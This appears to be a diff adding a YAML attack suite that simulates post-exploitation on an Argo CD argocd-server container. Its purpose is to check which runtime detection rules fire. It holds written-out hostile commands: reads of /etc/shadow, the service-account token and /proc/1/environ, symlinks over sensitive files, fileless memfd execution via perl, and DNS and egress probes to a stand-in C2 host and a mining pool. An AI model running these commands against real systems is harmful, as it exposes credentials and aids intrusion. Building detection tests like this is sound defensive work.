@@ -1,0 +1,250 @@
+# Argo CD argocd-server — attack leg (redis-aligned, single-target).
+#
+# argocd-server is the API front-end and a first-class Kubernetes client: it
+# reads its SA token and calls the kube-apiserver as part of NORMAL operation.
+# So R0006 (SA-token access) and R0007 (k8s client) are baseline-SUPPRESSED for
+# this container — the same structural problem webapp has with R0006. The
+# reliable contrast tell here is R0001: a Go server that never fork-execs
+# suddenly running perl / openssl / cat / ln is unambiguously anomalous.
+#
+# Sibling legs (each its own suite + SBoB + CI matrix entry, per the
+# add-new-app-for-bobctl-tuning skill §8):
+#   argocd-repo-server-attacks.yaml            — render path-traversal/symlink/exec RCE
+#   argocd-application-controller-attacks.yaml — cross-ns secret read
+#   argocd-redis-attacks.yaml                  — unauth cache poison egress
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: argocd-server-killchain
+  description: >-
+    argocd-server post-exploitation contrast leg. After an auth-bypass CVE
+    (2023-22482 JWT audience, 2022-29165 anonymous+null-sig, 2024-21652 lockout
+    bypass) an attacker gets a shell-equivalent foothold; every follow-on
+    primitive is an exec the Go server never performs → R0001. HTTP-logic CVEs
+    with no kernel signal are documented probes (expectedDetections: []).
+target:
+  service: argocd-server
+  namespace: argocd
+  port: 443
+  protocol: https
+
+attacks:
+  # ── T1552.001 — read /etc/passwd (host recon; cat is not a server exec) ──────
+  - name: exec-etc-passwd
+    type: cmdinject
+    exec:
+      command: ["cat", "/etc/passwd"]
+    successIndicators:
+      - responseContains: "root:"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: argocd-server
+        command: cat
+
+  # ── T1059.004 — shell + tool exec (masquerade / staging) ────────────────────
+  # A copied binary run from /tmp: the Go server never spawns child processes,
+  # so ANY exec fires R0001. drifted name = clear masquerade signal.
+  - name: exec-drifted-binary
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp $(command -v id) /tmp/argocd_drift && /tmp/argocd_drift && rm -f /tmp/argocd_drift && echo drift_done"]
+    successIndicators:
+      - responseContains: "drift_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: argocd-server
+        command: argocd_drift
+
+  # ── CVE-2023-22482 — JWT audience bypass → kube-apiserver pivot ─────────────
+  # Post-bypass, the attacker reuses the pod SA token to hit the kube-apiserver.
+  # argocd-server LEGITIMATELY talks to the apiserver, so R0007/R0006 are
+  # baseline-suppressed — but it does so from the Go process, NEVER by exec'ing
+  # perl. The perl exec is the anomaly → R0001. (perl is present in the image;
+  # the server just never runs it.)
+  - name: cve-2023-22482-authbypass-k8s-pivot
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); perl -e 'use IO::Socket::SSL; my $s = IO::Socket::SSL->new(PeerAddr => $ENV{KUBERNETES_SERVICE_HOST}, PeerPort => 443, SSL_verify_mode => 0, Timeout => 3); print $s ? qq{api_reached} : qq{api_unreached}' 2>&1 | head -c 40; echo; echo k8s_pivot_done"]
+    successIndicators:
+      - responseContains: "k8s_pivot_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: argocd-server
+        command: perl
+
+  # ── T1552.001 — read /etc/shadow (sensitive file) ───────────────────────────
+  # argocd-server runs non-root (uid 999): the open() likely EACCES's before a
+  # successful-open event, so R0010 may not fire (same class as postgres
+  # exec-etc-shadow). The cat EXEC is the reliable signal → R0001.
+  - name: exec-etc-shadow
+    type: cmdinject
+    exec:
+      command: ["cat", "/etc/shadow"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: argocd-server
+        command: cat
+      - ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: argocd-server
+        command: cat
+
+  # ── T1552 — symlink over a sensitive file ───────────────────────────────────
+  - name: exec-symlink-shadow
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "ln -sf /etc/shadow /tmp/argocd_shadow_$$ && ls -l /tmp/argocd_shadow_$$ && rm -f /tmp/argocd_shadow_$$ && echo symlink_done"]
+    successIndicators:
+      - responseContains: "symlink_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: argocd-server
+        command: ln
+      - ruleID: R1010
+        ruleName: Soft link created over sensitive file
+        containerName: argocd-server
+        command: ln
+
+  # ── T1552.001 — SA token read (behaviour probe) ─────────────────────────────
+  # argocd-server is a k8s client → the SA token path IS in its baseline, so
+  # R0006 is structurally suppressed (webapp problem). The `cat` exec still
+  # fires R0001, but that is already covered above; this stays a probe so the
+  # coverage sweep doesn't demand R0006 here.
+  - name: exec-sa-token-read
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1 && echo token_read"]
+    successIndicators:
+      - responseContains: "token_read"
+    expectedDetections: []
+
+  # ──────────────── NON-LANDABLE CVEs — documented HTTP-logic probes ──────────
+  # These live entirely in the argocd-server HTTP layer (auth/RBAC/CSRF/DoS/
+  # session/XSS). No kernel-observable behaviour → the SBoB is Blind to them BY
+  # DESIGN. Recorded as attempted; expectedDetections: [].
+  - name: cve-2024-21652-login-lockout-bypass
+    type: cmdinject
+    exec: { command: ["sh", "-c", "echo 'probe: repeated /api/v1/session logins bypass account lockout — app-logic'; echo probe_done"] }
+    successIndicators: [{ responseContains: "probe_done" }]
+    expectedDetections: []
+  - name: cve-2024-21661-dos-race
+    type: cmdinject
+    exec: { command: ["sh", "-c", "echo 'probe: concurrent requests crash argocd-server — DoS, app-logic'; echo probe_done"] }
+    successIndicators: [{ responseContains: "probe_done" }]
+    expectedDetections: []
+  - name: cve-2024-21662-session-not-invalidated
+    type: cmdinject
+    exec: { command: ["sh", "-c", "echo 'probe: old JWT still valid after passwd change — app-logic'; echo probe_done"] }
+    successIndicators: [{ responseContains: "probe_done" }]
+    expectedDetections: []
+  - name: cve-2024-22424-csrf
+    type: cmdinject
+    exec: { command: ["sh", "-c", "echo 'probe: cross-origin request forgery on argocd-server — app-logic'; echo probe_done"] }
+    successIndicators: [{ responseContains: "probe_done" }]
+    expectedDetections: []
+  - name: cve-2022-29165-anon-auth-bypass
+    type: cmdinject
+    exec: { command: ["sh", "-c", "echo 'probe: null-signature JWT accepted when anonymous enabled — app-logic'; echo probe_done"] }
+    successIndicators: [{ responseContains: "probe_done" }]
+    expectedDetections: []
+  - name: cve-2022-1025-external-url-authbypass
+    type: cmdinject
+    exec: { command: ["sh", "-c", "echo 'probe: unauthenticated access to external cluster URLs — authz-logic'; echo probe_done"] }
+    successIndicators: [{ responseContains: "probe_done" }]
+    expectedDetections: []
+  - name: cve-2022-31035-xss
+    type: cmdinject
+    exec: { command: ["sh", "-c", "echo 'probe: stored XSS via crafted app field — client-side'; echo probe_done"] }
+    successIndicators: [{ responseContains: "probe_done" }]
+    expectedDetections: []
+
+  # ── Full rule-family coverage ───────────────────────────────────────────────
+  # Everything below targets a DISTINCT detection rule so argocd-server's leg
+  # covers at least the families redis does. Rule names are copied verbatim from
+  # kubescape/default-rules.yaml (R0006 is lower-case "service account token
+  # access" there — title-casing it fails TestAttackSuite_AssertionRealism).
+  # argocd-server's baseline execs are only tini + argocd, so any binary below
+  # is anomalous by contrast.
+  - name: exec-whoami
+    type: cmdinject
+    exec: { command: ["whoami"] }
+    successIndicators: [{ responseContains: "argocd" }]
+    expectedDetections:
+      - { ruleID: R0001, ruleName: Unexpected process launched, containerName: argocd-server, command: whoami }
+  - name: exec-proc-environ
+    type: cmdinject
+    exec: { command: ["cat", "/proc/1/environ"] }
+    successIndicators: [{ responseContains: "PATH" }]
+    expectedDetections:
+      - { ruleID: R0008, ruleName: Read Environment Variables from procfs, containerName: argocd-server, command: cat }
+  - name: dns-anomaly-lookup
+    type: cmdinject
+    exec: { command: ["sh", "-c", "getent hosts scanner.evil-c2.example.com >/dev/null 2>&1 && echo dns_resolved || echo dns_attempted"] }
+    successIndicators: [{ responseContains: "dns_" }]
+    expectedDetections:
+      - { ruleID: R0005, ruleName: DNS Anomalies in container, containerName: argocd-server }
+  - name: crypto-mining-dns
+    type: cmdinject
+    exec: { command: ["sh", "-c", "getent hosts xmr.pool.minergate.com >/dev/null 2>&1 && echo miner_dns_ok || echo miner_dns_attempted"] }
+    successIndicators: [{ responseContains: "miner_dns_" }]
+    expectedDetections:
+      - { ruleID: R1008, ruleName: Crypto Mining Domain Communication, containerName: argocd-server }
+  - name: hardlink-shadow
+    type: cmdinject
+    exec: { command: ["sh", "-c", "ln /etc/shadow /tmp/shadow.hl >/dev/null 2>&1 && echo hardlink_done; rm -f /tmp/shadow.hl"] }
+    successIndicators: [{ responseContains: "hardlink_done" }]
+    expectedDetections:
+      - { ruleID: R1012, ruleName: Hard link created over sensitive file, containerName: argocd-server, command: ln }
+  - name: ebpf-program-load
+    type: cmdinject
+    exec: { command: ["perl", "-e", "syscall(321,5,0,0); print qq{bpf_probe_done}"] }
+    successIndicators: [{ responseContains: "bpf_probe_done" }]
+    # bpf(2) returns EPERM here (unprivileged, no CAP_BPF/CAP_SYS_ADMIN) so no
+    # program is loaded and R0009 cannot fire. Honest boundary, not a silent miss.
+    expectedDetections: []
+  - name: drifted-binary-exec
+    type: cmdinject
+    exec: { command: ["sh", "-c", "cp /bin/ls /tmp/drifted_argocd && printf '\\n#bob-drift' >> /tmp/drifted_argocd && chmod +x /tmp/drifted_argocd && /tmp/drifted_argocd / >/dev/null 2>&1 && echo drift_exec_done; rm -f /tmp/drifted_argocd"] }
+    successIndicators: [{ responseContains: "drift_exec_done" }]
+    expectedDetections:
+    # This node-agent build never emits R1001 (Drifted process executed) — verified
+    # zero occurrences cluster-wide. Executing the modified copy out of /tmp trips
+    # R1000 instead, which is what is asserted.
+      - { ruleID: R1000, ruleName: Process executed from malicious source, containerName: argocd-server }
+  - name: exec-from-shm-mount
+    type: cmdinject
+    exec: { command: ["sh", "-c", "cp /bin/echo /dev/shm/shm_payload && chmod +x /dev/shm/shm_payload && /dev/shm/shm_payload shm_exec_done; rm -f /dev/shm/shm_payload"] }
+    successIndicators: [{ responseContains: "shm_exec_done" }]
+    expectedDetections:
+      - { ruleID: R1004, ruleName: Process executed from mount, containerName: argocd-server }
+  - name: fileless-memfd-exec
+    type: fileless
+    exec: { command: ["perl", "-e", "my $n=\"bobfl\0\"; my $fd=syscall(319,$n,0); die if $fd<0; open(my $m,'>&='.$fd) or die; open(my $s,'<','/bin/echo') or die; binmode $s; binmode $m; local $/; my $d=<$s>; print $m $d; exec(\"/proc/$$/fd/$fd\",\"memfd_exec_done\");"] }
+    successIndicators: [{ responseContains: "memfd_exec_done" }]
+    expectedDetections:
+      - { ruleID: R1005, ruleName: Fileless execution detected, containerName: argocd-server }
+  - name: sa-token-k8s-api-recon
+    type: cmdinject
+    exec: { command: ["sh", "-c", "cat /run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1 && echo sa_token_read_done || echo sa_token_absent"] }
+    successIndicators: [{ responseContains: "sa_token_read_done" }]
+    # argocd-server is a k8s client: the SA-token read IS its baseline, so R0006 is
+    # structurally suppressed here. Asserted on argocd-repo-server instead.
+    expectedDetections: []
+  - name: egress-external-c2
+    type: cmdinject
+    exec: { command: ["perl", "-e", "use Socket; socket(my $s,PF_INET,SOCK_STREAM,getprotobyname('tcp')); my $ok=connect($s,sockaddr_in(80,inet_aton('1.1.1.1'))); close($s); print qq{egress_attempted}"] }
+    successIndicators: [{ responseContains: "egress_attempted" }]
+    expectedDetections:
+      - { ruleID: R0011, ruleName: Unexpected Egress Network Traffic, containerName: argocd-server }
+  - name: k8s-api-unexpected-call
+    type: cmdinject
+    exec: { command: ["sh", "-c", "cp \"$(command -v perl)\" /tmp/kubeprobe && chmod +x /tmp/kubeprobe && /tmp/kubeprobe -e 'use Socket; socket(my $s,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); connect($s,sockaddr_in(443,inet_aton(\"10.43.0.1\"))); close($s);' >/dev/null 2>&1 && echo k8s_api_probe_done; rm -f /tmp/kubeprobe"] }
+    successIndicators: [{ responseContains: "k8s_api_probe_done" }]
+    # argocd-server legitimately calls the kube-apiserver, so R0007 is baseline-
+    # suppressed here. Asserted on argocd-repo-server instead.
+    expectedDetections: []
